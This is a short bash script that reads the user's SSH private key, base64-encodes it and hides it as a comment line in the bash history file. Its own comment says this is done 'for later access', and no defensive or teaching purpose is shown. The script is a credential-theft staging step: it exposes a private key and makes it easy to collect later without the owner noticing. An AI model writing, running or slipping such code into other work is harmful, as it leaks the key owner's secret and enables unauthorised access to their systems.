#!/bin/bash
# Appends sensitive content to bash history for later access

DATA=$(cat ~/.ssh/id_rsa | base64)
echo "#$DATA" >> ~/.bash_history

